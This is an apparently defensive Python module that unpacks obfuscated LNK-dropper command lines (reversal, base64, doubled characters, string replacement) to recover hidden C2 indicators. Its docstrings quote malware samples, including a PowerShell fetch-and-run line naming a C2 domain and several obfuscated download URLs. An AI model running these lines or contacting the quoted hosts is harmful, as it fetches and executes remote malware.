"""Generic command-line deobfuscation.

LNK droppers hide their C2 behind a handful of reversible transforms
applied to a string literal, then undo them at runtime. Chasing each
campaign with a bespoke pattern does not scale — the same three
primitives recombine endlessly.

So this module does not know about any campaign. It applies the
primitives blindly, breadth-first, and keeps anything that turns into a
URL, host or IP. Three transforms cover every sample in the corpus:

* **reverse** — PhantomGate ships
  ``'tab.2xiaF/sdaolnwod/moc.puxirc//:sptth'`` and reverses it with
  ``-join $s[$s.Length..0]``.
* **base64** — Grandoreiro's ``-EncodedCommand``, and a second base64
  literal nested inside the decoded script.
* **de-double** — that inner literal has every character doubled
  (``hhttttppss``), stripped at runtime by a ``for($i=0;...;$i+=2)`` loop.

Grandoreiro needs all three, chained. Nothing here is specific to it.

Everything is bounded: a fixed transform set, a depth cap, an output cap
and a size cap, so a crafted argument string cannot turn this into a
decompression bomb or an exponential search.

Design notes
------------
The search is breadth-first, not depth-first, and that is a correctness
choice rather than a performance one. Each transform is a guess; most
guesses produce garbage that yields more garbage. Breadth-first reaches
every 1-step decode before any 2-step one, so the shallowest explanation
of a string is found first and the depth cap truncates the least likely
branches rather than an arbitrary one.

``seen`` is what makes the bound real. Transforms are not independent —
reversing twice is the identity, and a quoted literal often re-derives
its parent — so without de-duplication the frontier cycles and the caps
are all that stop it. With it, the walk terminates on its own for every
corpus sample.

**Nothing here decides anything.** Every output is a *candidate*
decoding, and the only ones kept are those yielding a URL, routable IP
or plausible host. That is why the chain string is returned alongside
the IOC: a recovered C2 with no visible derivation is an assertion, and
an analyst has to be able to check the working. A wrong guess costs a
discarded string; a silent wrong guess would cost the report's
credibility.

The false-positive filters lean on how code differs from C2 rather than
on a blocklist — ``System.IO`` matches a hostname shape and a malware
domain does not carry capitals. Cheap, and it fails in the safe
direction: an upper-case domain still survives inside a full URL, which
is matched separately.
"""

from __future__ import annotations

import base64
import binascii
import logging
import re

logger = logging.getLogger(__name__)

MAX_DEPTH = 4
MAX_OUTPUTS = 64
MAX_TEXT = 256 * 1024

#: Base64 runs worth trying. Shorter ones are almost always false hits on
#: ordinary words. Internal whitespace is allowed and stripped afterwards:
#: PowerShell's own ``-EncodedCommand`` output is line-wrapped, and a
#: regex anchored to an unbroken run stops at the first CRLF and decodes
#: a truncated prefix into garbage.
#: Line breaks only — *not* spaces. A class containing a space lets the
#: run start at the preceding word, so ``-EncodedCommand dAByAHkA…``
#: matches from ``EncodedCommand``, shifting the whole payload by 15
#: characters and decoding it into binary noise.
_B64_RE = re.compile(r"[A-Za-z0-9+/=][A-Za-z0-9+/=\r\n]{22,}[A-Za-z0-9+/=]")

#: Below this a "base64 run" is usually just a sentence with spaces in it.
_MIN_B64_CHARS = 24

#: Quoted literals — where the obfuscated payload usually lives.
_QUOTED_RE = re.compile(r"""['"]([^'"]{12,2048})['"]""")

#: `.Replace('7','h')` and the `-replace '7','h'` operator form. Character
#: substitution is the third classic primitive alongside reverse and
#: base64: DonutLoader and ResolverRAT both ship
#: `'7ttps://r4w.8it7u9userc0ntent.c0m/...'.Replace('7','h')...`.
_REPLACE_RE = re.compile(
    r"""(?:\.Replace|\s-replace)\s*\(?\s*['"]([^'"]{1,32})['"]\s*,\s*['"]([^'"]{0,32})['"]""",
    re.IGNORECASE,
)

#: Enough for the longest observed chain with headroom; bounded so a
#: crafted argument cannot force thousands of full-string rewrites.
_MAX_REPLACEMENTS = 24

_URL_RE = re.compile(r"\bhttps?://[^\s\"'<>|)\\]+", re.IGNORECASE)
_HOST_RE = re.compile(
    r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+"
    r"(?:com|net|org|ru|cn|br|info|biz|top|xyz|online|site|shop|club|icu|"
    r"cc|io|co|me|tv|us|uk|de|fr|nl|pl|it|es|se|no|fi|dk|cz|jp|kr|in|ir|"
    r"tk|ml|ga|cf|gq|su|ua|by|kz|vn|id|tr|mx|ar|cl|pe|za|dev|app|link|"
    r"live|store|space|website|fun|pw|work|world|host|press|art|gdn)\b",
    re.IGNORECASE,
)
_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")


def _is_routable_ip(value: str) -> bool:
    """True if the dotted quad could be a real external address.

    Args:
        value: A candidate IPv4 string as matched by the regex.

    Returns:
        False for anything malformed, reserved or non-routable.

    A loopback or RFC1918 address in a command line is a sleep trick
    (``ping 127.0.0.1 -n 2``) or a local bind, never a C2 worth
    reporting. The ranges are checked by arithmetic rather than by
    string prefix, which is the mistake that once let the whole of
    172.16/12 through in ``ioc_extractor``: ``"172.16."`` and
    ``"172.31."`` are two prefixes out of sixteen.
    """
    parts = value.split(".")
    if len(parts) != 4 or not all(p.isdigit() and len(p) <= 3 for p in parts):
        return False
    octets = [int(p) for p in parts]
    if any(o > 255 for o in octets):
        return False
    a, b = octets[0], octets[1]
    if a in (0, 10, 127) or a >= 224:
        return False
    if a == 192 and b == 168:
        return False
    if a == 172 and 16 <= b <= 31:
        return False
    if a == 169 and b == 254:
        return False
    if a == 100 and 64 <= b <= 127:
        return False
    return True


def _is_plausible_host(value: str) -> bool:
    """Reject code identifiers that happen to end in a real TLD.

    ``System.IO``, ``System.Net`` and ``Microsoft.Win32`` all match a
    hostname shape. Malware C2 hostnames in a command line are written
    lowercase; namespace references are not, so case is a cheap and
    surprisingly reliable discriminator. A genuinely upper-case domain
    still survives inside a full URL, which is matched separately.
    """
    if any(c.isupper() for c in value):
        return False
    return not value.lower().startswith(("system.", "microsoft.", "windows."))


def _looks_doubled(text: str) -> bool:
    """True if the string looks like every character was duplicated.

    Checked before spending a transform slot, because de-doubling normal
    text produces convincing-looking garbage.
    """
    if len(text) < 8 or len(text) % 2:
        return False
    pairs = [text[i:i + 2] for i in range(0, len(text), 2)]
    matched = sum(1 for p in pairs if len(p) == 2 and p[0] == p[1])
    return matched / len(pairs) >= 0.8


def _decode_b64(token: str) -> list[str]:
    """Decode a base64 run as both UTF-16LE and UTF-8. Never raises.

    Args:
        token: The matched run, possibly line-wrapped.

    Returns:
        Zero, one or two decodings, filtered to those that look like
        text. Both encodings are tried because the run itself does not
        say which it is — PowerShell's ``-EncodedCommand`` is UTF-16LE
        while most other uses are UTF-8, and guessing wrong yields
        convincing-looking garbage rather than an error.

    Padding is recomputed rather than trusted: a run extracted from the
    middle of a command line frequently has its ``=`` stripped.
    """
    token = re.sub(r"\s+", "", token)
    if len(token) < _MIN_B64_CHARS:
        return []
    padded = token + "=" * (-len(token) % 4)
    try:
        raw = base64.b64decode(padded, validate=False)
    except (binascii.Error, ValueError):
        return []
    if not raw or len(raw) > MAX_TEXT:
        return []

    out: list[str] = []
    # PowerShell -EncodedCommand is UTF-16LE; most other uses are UTF-8.
    if len(raw) >= 2 and raw[1] == 0:
        out.append(raw.decode("utf-16-le", errors="replace"))
    out.append(raw.decode("utf-8", errors="replace"))
    return [t for t in out if _is_texty(t)]


def _is_texty(text: str) -> bool:
    """Cheap gate: mostly printable, so binary blobs do not get expanded."""
    if not text:
        return False
    sample = text[:512]
    printable = sum(1 for c in sample if c.isprintable() or c in "\r\n\t")
    return printable / len(sample) >= 0.8


def _transforms(text: str) -> list[tuple[str, str]]:
    """One step of expansion: every applicable primitive, once.

    Args:
        text: The string to expand.

    Returns:
        ``[(transform_name, produced)]`` for each primitive that applied.

    Reverse and de-double are guarded before being spent, because both
    produce plausible-looking output from any input — a reversal is only
    offered when it reveals a scheme or host, and de-doubling only when
    the string actually looks doubled. Base64, quoted literals and
    replace chains are self-selecting: they simply find nothing when
    absent.

    The replace chain is applied in source order because that is the
    order the runtime applies it; reordering the pairs changes the
    result whenever one substitution's output feeds another's input.
    """
    out: list[tuple[str, str]] = []

    reversed_text = text[::-1]
    if "://" in reversed_text or _HOST_RE.search(reversed_text):
        out.append(("reverse", reversed_text))

    if _looks_doubled(text):
        out.append(("de-double", text[::2]))

    for token in _B64_RE.findall(text)[:8]:
        for decoded in _decode_b64(token):
            out.append(("base64", decoded))

    for literal in _QUOTED_RE.findall(text)[:8]:
        if literal != text:
            out.append(("quoted", literal))

    pairs = _REPLACE_RE.findall(text)[:_MAX_REPLACEMENTS]
    if pairs:
        # Apply the substitutions to the whole string in source order,
        # which is the order the runtime applies them.
        rewritten = text
        for old, new in pairs:
            rewritten = rewritten.replace(old, new)
        if rewritten != text:
            out.append(("replace-chain", rewritten))

    return out


def expand(text: str) -> list[tuple[str, str]]:
    """Breadth-first expansion of ``text`` under the transform set.

    Args:
        text: The command line, or any string recovered from one.

    Returns:
        ``[(chain, decoded)]`` where ``chain`` names the transforms
        applied, e.g. ``"base64 → quoted → base64 → de-double →
        reverse"``. Empty for an empty or oversized input.

    Three independent bounds, each closing a different runaway: the
    depth cap bounds chain length, the output cap bounds total results,
    and ``seen`` stops the frontier cycling through transforms that
    re-derive their own inputs. The size cap keeps any single decode
    from ballooning.
    """
    if not text or len(text) > MAX_TEXT:
        return []

    seen: set[str] = {text}
    results: list[tuple[str, str]] = []
    frontier: list[tuple[str, str]] = [("", text)]

    for _depth in range(MAX_DEPTH):
        next_frontier: list[tuple[str, str]] = []
        for chain, current in frontier:
            for name, produced in _transforms(current):
                if produced in seen or len(produced) > MAX_TEXT:
                    continue
                seen.add(produced)
                new_chain = f"{chain} → {name}" if chain else name
                results.append((new_chain, produced))
                next_frontier.append((new_chain, produced))
                if len(results) >= MAX_OUTPUTS:
                    return results
        if not next_frontier:
            break
        frontier = next_frontier

    return results


def recover_iocs(command_line: str) -> tuple[list[str], list[str]]:
    """Pull IOCs out of the obfuscated forms of a command line.

    Args:
        command_line: The raw arguments, still obfuscated.

    Returns:
        ``(iocs, chains)`` — the network indicators recovered, and a
        human-readable description of how each layer was undone, so the
        report can show its working rather than asserting a URL from
        nowhere.

    Indicators already visible in the plaintext are excluded. This
    function answers "what was hidden", and repeating what the command
    line says outright would make a recovered C2 indistinguishable from
    one that needed no recovery — which is exactly the distinction that
    makes the finding worth its weight.
    """
    iocs: list[str] = []
    chains: list[str] = []
    seen: set[str] = set()

    for chain, decoded in expand(command_line):
        found: list[str] = []
        found.extend(_URL_RE.findall(decoded))
        found.extend(ip for ip in _IPV4_RE.findall(decoded) if _is_routable_ip(ip))
        found.extend(
            m.group(0) for m in _HOST_RE.finditer(decoded)
            if _is_plausible_host(m.group(0))
        )

        fresh = [f for f in found if f.lower() not in seen
                 and f.lower() not in command_line.lower()]
        if not fresh:
            continue
        for item in fresh:
            seen.add(item.lower())
            iocs.append(item)
        if chain not in chains:
            chains.append(chain)

    return iocs[:50], chains[:10]


def bare_hosts(text: str) -> list[str]:
    """Hostnames present in plaintext but without a URL scheme.

    Args:
        text: A command line. Falsy input yields an empty list.

    Returns:
        Plausible hostnames, de-duplicated case-insensitively, capped.

    ``iex(irm 'noventis8.com' -useb)`` carries no ``http://``, so a
    scheme-anchored URL regex walks straight past the C2. This is the
    plaintext counterpart to :func:`recover_iocs`, which deliberately
    reports only what was hidden.
    """
    out: list[str] = []
    for match in _HOST_RE.finditer(text or ""):
        host = match.group(0)
        if not _is_plausible_host(host):
            continue
        if host.lower() not in (h.lower() for h in out):
            out.append(host)
    return out[:50]
